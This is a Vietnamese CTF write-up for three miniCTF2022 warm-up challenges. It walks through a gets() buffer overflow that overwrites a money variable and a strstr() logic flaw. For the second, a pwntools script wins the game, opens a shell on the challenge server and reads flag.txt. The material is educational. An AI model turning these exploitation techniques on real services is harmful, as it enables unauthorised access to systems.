
# Warm Up:  NetCat


#### Challegen

Can you connect the netcat ? 
>nc 174.138.21.217 3136

#### Solution
Chúng ta sẽ kết nối vào `netcat` ngay lập tức flag sẽ hiện ra.

```
halston in ~ λ nc 174.138.21.217 3136
                              NETCAT
                            /\_____/\
                           /  o   o  \
                          ( ==  ^  == )
                          ))         (
                          (           )
                         ( (  )   (  ) )
                        (__(__)___(__)__)

Here your flag: ISPCTF{Th1s_1s_n3t_c4t}
```

Flag: `ISPCTF{Th1s_1s_n3t_c4t}`

# Warm Up: abcbof

#### Challegen
>nc 174.138.21.217 3137

#### Solution
Khi tải source code về ta có thể nhìn thấy có lỗi tại gets() vì khi nhập vào sẽ không kiểm soát số lượng kí tự được nhập
```
int main(){   
    long long money = 0;
    puts("==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================");
    puts("| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Thoát Game |  5. Tài Khoản |");
    puts("======================================================================================");
    puts("Hãy nhập tên người chơi:");
    char name[30];
    gets(name);
```
Vì vậy khi ta nhập 1 dãy thật dài thì chương trình sẽ ghi đè lên biến money và làm thay đổi giá trị của biến.
```
halston in ~ λ nc 174.138.21.217 3137



                                         I
                                      II   II
                                   II         II
                                ,I               II
                              I,       IIIIII       II
                           II       IIIIIIIIIIII       II
                        II       IIIIIIIIIIIIIIIIII#      II
                     II        IIIIIIIIIIIIIIIIIIIIIII       II
                  II        IIIIIIIIIII       IIIIIIII  II      II
           IIIIII            IIIIIII            IIIIII  IIIII      II
           IIIII        II    IIIIIII           IIIIII  IIIIIIII      II.
            #I      I   IIII    IIIIIII         IIIIII  IIIIIIIIIII     I
                 IIIII  IIIII    IIIIIIIII     .IIIIII  IIII   IIIII    I
        IIIII  IIIIIII   IIIIII    IIIIIIIII     IIIII  IIII    IIII    I
        IIIII  #IIIIII   IIIIII       IIIIIIIII      I  IIII   IIII    I
           I    IIIIIII   IIIIII  I     IIIIIIIIIII     IIIII# IIII    I
           I     IIIIII   IIIIIII  II      IIIIIIIIII  IIIIIIIIIII    II
            I    IIIIIII   IIIIIII  III#     IIIIIII   IIIIIIIIIII    I
            I     IIIIIII   IIIIIII  IIIII  IIIIIIII  IIIIIIIIIII    I
             I     IIIIIII   IIIIIII  IIII IIIIIIII   IIIIIIIIII    II
              I     IIIIIII   IIIIIII  II IIIIIIII#  IIIIIIIIII     I
               I     IIIIIII   IIIIIIII  IIIIIIIII  *IIIIII II     I
                I     IIIIIII   IIIIIIIIIIIIIIIII   IIIIII II     I
                 I     IIIIIII   IIIIIIIIIIIIIII   IIIII* II    #I
                  I      IIIIII    IIIIIIIIIIII   IIIII  I     II
                   I.     IIIIIII    IIIIIIIII   IIIII II     I
                     I      IIIIIII   IIIIII   IIIIII I      I
                      II      IIIIII    III   IIIII        I
                        II      IIIIII      IIIIII       II
                          II      IIIIII   IIIII       II
                            II      IIIIIIIIII       II
                               II                  I
                                 III            II
                                    #II     III
                                        III


Hãy nhập tên người chơi: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
==========================Game Bài Đoán Số Uy Tín Đổi Thưởng==========================
| 1. Chơi Game   |  2. Hướng Dẫn   |   3. Đổi Flag   |  4. Tài Khoản | 5. Thoát Game |
======================================================================================

Hello �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, chào mừng bạn đến với Game Bài Uy Tín Top 1 Việt Nam !!!
Nhập lựa chọn của bạn:
4

Tài khoản của bạn có 7016996765293437281 $
```
Từ đó ta có thể mua flag
```
Nhập lựa chọn của bạn:
3

Tài khoản của bạn có 7016996765293437281 $
=====================FLAG=======================
|Bạn có muốn mua FLAG với giá 1 000 000 000 $  |
|----------------------------------------------|
|         1. YES      |         2. NO          |
================================================
Lựa chọn của bạn :
1


Chúc mừng bạn đã chiến thắng
Đây là Flag của bạn:
ISPCTF{B4s1c_Buff3r_0v3rFl0w}
```

Flag: `ISPCTF{B4s1c_Buff3r_0v3rFl0w}`

# Warm Up: RPS

#### Challegen

>nc 174.138.21.217 3138

#### Solution
Đọc source code ta có thấy chương trình sử dụng `if (strstr(player_turn, loses[computer_turn]))` hàm strstr() để kiểm tra chuỗi người dùng nhập vào `player_turn` có 
trong chuỗi `loses[computer_turn]` máy tính thua không.
Nếu có sẽ trả về `true` từ đó ta có 1 lần chiến thắng.
```
if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
```
Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 6 lần để có thể chiến thắng.
```
 if (wins >= 6) {
        puts("Congrats!!!");
        system("/bin/sh");
	
      }
```
Payload khai thác.
```
halston in ~/CTF/miniCTF2022/warmup/RPS λ cat exploit.py
from pwn import *

p = remote("174.138.21.217", 3138)

for i in range(6):
        p.recvuntil(b"Type '2' to exit the program")
        p.sendline(b"1")
        p.recvuntil(b"Please make your selection (rock/paper/scissors):")
        p.sendline(b"rock/paper/scissors")

p.interactive()
```
Run payload bằng python
```
halston in ~/CTF/miniCTF2022/warmup/RPS λ python3 exploit.py
[+] Opening connection to 174.138.21.217 on port 3138: Done
[*] Switching to interactive mode

You played: rock/paper/scissors
The computer played: rock
You win! Play again?
Congrats!!!
$ ls
bin
chall
dev
flag.txt
ld.so
lib
lib32
lib64
libc.so.6
$ cat flag.txt
ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}
```


Flag: `ISPCTF{d0nt_m4k3_7h3_l091c4l_m1s74k3}`
